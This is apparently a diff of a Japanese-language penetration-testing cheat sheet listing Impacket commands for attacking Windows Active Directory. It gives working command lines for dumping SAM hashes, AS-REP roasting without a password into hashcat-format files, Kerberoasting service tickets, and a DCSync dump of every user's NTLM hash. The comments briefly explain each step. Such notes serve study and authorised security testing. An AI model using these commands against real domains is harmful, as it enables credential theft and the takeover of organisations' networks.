@@ -9,7 +9,9 @@ impacket-secretsdump -sam <file> -system <file> LOCAL #SAMとsystemのハッシ�
 /usr/share/doc/python3-impacket/examples/ #impacketのパス
 #上記のディレクトリに移動して直接pythonスクリプトを動かすときと、impacketコマンドから実行するときで結果が違った。両方試せ
 
-./GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手できるユーザの列挙
+impacket-GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手できるユーザの列挙、その後-requestオプションをつけてhashを入手
+impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile user.txt -format hashcat -outputfile hash.txt -no-pass #パスワード認証なしでハッシュの入手を試みる
+
 impacket-GetUserSPNs <domain name>/<user>:<pass> -dc-ip <IP> -request #TGSを入手 -request-user <user> で特定のユーザに絞れる
 ./secretsdump.py -just-dc-ntlm <user>@<domain> -outputfile <file name> #DCSyncがあるユーザで全員のNTLMをダンプ
 impacket-secretsdump <domain>/<user>:<pass>@<IP> #ドメイン情報からパスワードダンプ
